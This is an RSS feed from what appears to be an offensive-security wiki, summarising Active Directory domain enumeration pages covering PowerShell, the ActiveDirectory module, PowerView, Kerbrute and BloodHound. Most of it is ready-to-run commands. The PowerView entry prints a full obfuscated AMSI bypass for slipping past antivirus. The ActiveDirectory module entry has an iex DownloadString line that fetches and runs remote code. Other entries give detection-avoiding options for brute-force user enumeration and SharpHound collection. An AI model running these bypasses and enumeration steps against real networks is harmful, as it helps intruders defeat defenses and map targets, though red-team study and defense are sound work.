<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Domain Enumeration on</title><link>https://wiki.bufu-sec.com/active_directory/domain_enumeration/</link><description>Recent content in Domain Enumeration on</description><generator>Hugo -- gohugo.io</generator><language>en-US</language><lastBuildDate>Sat, 06 Nov 2021 10:02:54 +0100</lastBuildDate><atom:link href="https://wiki.bufu-sec.com/active_directory/domain_enumeration/index.xml" rel="self" type="application/rss+xml"/><item><title>PowerShell</title><link>https://wiki.bufu-sec.com/active_directory/domain_enumeration/powershell/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_enumeration/powershell/</guid><description>Users # # Show local users Get-LocalUser # Show number of local users Get-LocalUser | Measure-Object -line # Get user by providing SID Get-LocalUser -SID &amp;#34;S-1-5-21-1394777289-3961777894-1791813945-501&amp;#34; # Show usernames and SIDs Get-LocalUser | Select-Object -Property Name,SID,Enabled # Show users that do not require a password Get-LocalUser | Where-Object -Property PasswordRequired -Eq $False Groups # # Show local groups Get-LocalGroup # Show number of local groups Get-LocalGroup | Measure-Object -line Networks # # Get network adapter and IP address information Get-NetIPAddress # Show only IPv4 addresses and show output in table format Get-NetIPAddress -AddressFamily IPv4 | Format-Table Get-NetIPAddress -AddressFamily IPv4 | ft # Show listening ports Get-NetTCPConnection -State Listen Computers &amp;amp; Files # # Show installed patches Get-HotFix # Show informatio about specific patch Get-HotFix -ID KB4023834 # Search for backup files Get-ChildItem -Path C:\ -Include *.</description></item><item><title>ActiveDirectory Module</title><link>https://wiki.bufu-sec.com/active_directory/domain_enumeration/ad_module/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_enumeration/ad_module/</guid><description>Enumeration using Native Executables and .NET Classes # $ADClass = [System.DirectoryServices.ActiveDirectory.Domain] $ADClass::GetCurrentDomain() ActiveDirectory Module Installation # https://github.com/samratashok/ADModule Will likely not get picked up by AV Works in CLM # If computer has internet access iex (new-Object Net.WebClient).DownloadString(&amp;#39;https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1&amp;#39;);Import-ActiveDirectory # If computer has no internet access, download repository Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1 # Check if module has been imported correctly Get-Command -Module ActiveDirectory Domains # # Get current domain Get-ADDomain # Get object of another domain Get-ADDomain -Identity lab.</description></item><item><title>PowerView</title><link>https://wiki.bufu-sec.com/active_directory/domain_enumeration/powerview/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_enumeration/powerview/</guid><description>Loading PowerView # # If it gets blocked by AMSI we can bypass it with S`eT-It`em ( &amp;#39;V&amp;#39;+&amp;#39;aR&amp;#39; + &amp;#39;IA&amp;#39; + (&amp;#39;blE:1&amp;#39;+&amp;#39;q2&amp;#39;) + (&amp;#39;uZ&amp;#39;+&amp;#39;x&amp;#39;) ) ( [TYpE]( &amp;#34;{1}{0}&amp;#34;-F&amp;#39;F&amp;#39;,&amp;#39;rE&amp;#39; ) ) ; ( Get-varI`A`BLE ( (&amp;#39;1Q&amp;#39;+&amp;#39;2U&amp;#39;) +&amp;#39;zX&amp;#39; ) -VaL ).&amp;#34;A`ss`Embly&amp;#34;.&amp;#34;GET`TY`Pe&amp;#34;(( &amp;#34;{6}{3}{1}{4}{2}{0}{5}&amp;#34; -f(&amp;#39;Uti&amp;#39;+&amp;#39;l&amp;#39;),&amp;#39;A&amp;#39;,(&amp;#39;Am&amp;#39;+&amp;#39;si&amp;#39;),(&amp;#39;.Man&amp;#39;+&amp;#39;age&amp;#39;+&amp;#39;men&amp;#39;+&amp;#39;t.&amp;#39;),(&amp;#39;u&amp;#39;+&amp;#39;to&amp;#39;+&amp;#39;mation.&amp;#39;),&amp;#39;s&amp;#39;,(&amp;#39;Syst&amp;#39;+&amp;#39;em&amp;#39;) ) ).&amp;#34;g`etf`iElD&amp;#34;( ( &amp;#34;{0}{2}{1}&amp;#34; -f(&amp;#39;a&amp;#39;+&amp;#39;msi&amp;#39;),&amp;#39;d&amp;#39;,(&amp;#39;I&amp;#39;+&amp;#39;nitF&amp;#39;+&amp;#39;aile&amp;#39;) ),( &amp;#34;{2}{4}{0}{1}{3}&amp;#34; -f (&amp;#39;S&amp;#39;+&amp;#39;tat&amp;#39;),&amp;#39;i&amp;#39;,(&amp;#39;Non&amp;#39;+&amp;#39;Publ&amp;#39;+&amp;#39;i&amp;#39;),&amp;#39;c&amp;#39;,&amp;#39;c,&amp;#39; )).&amp;#34;sE`T`VaLUE&amp;#34;( ${n`ULl},${t`RuE} ) # Then load the module Import-Module .\PowerView.ps1 . .\PowerView.ps1 Domains # General domain information Password policy Ticket policy, interesting for crafting appropriate golden/silver tickets List of domain controllers and HVTs # Get current domain Get-NetDomain # Get object of another domain Get-NetDomain -Domain lab.</description></item><item><title>Kerbrute</title><link>https://wiki.bufu-sec.com/active_directory/domain_enumeration/kerbrute/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_enumeration/kerbrute/</guid><description>Overview # Get precompiled binary for OS from https://github.com/ropnop/kerbrute/releases Does not trigger failed log on event Brute-force by sending only a single UDP frame to the KDC Enumerate users on the domain from a wordlist Exploitation # # Username enumeration kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt</description></item><item><title>BloodHound</title><link>https://wiki.bufu-sec.com/active_directory/domain_enumeration/bloodhound/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/domain_enumeration/bloodhound/</guid><description>Setup # # Install bloodhound apt install bloodhound # Start console neo4j console # Open web console and login with default credentials: neo4j:neo4j firefox http://localhost:7474/browser/ # Start bloodhound and login with credentials bloodhound Get Loot with SharpHound.ps1 # # Default Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip # Try to avoid detection Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip -ExcludeDC</description></item></channel></rss>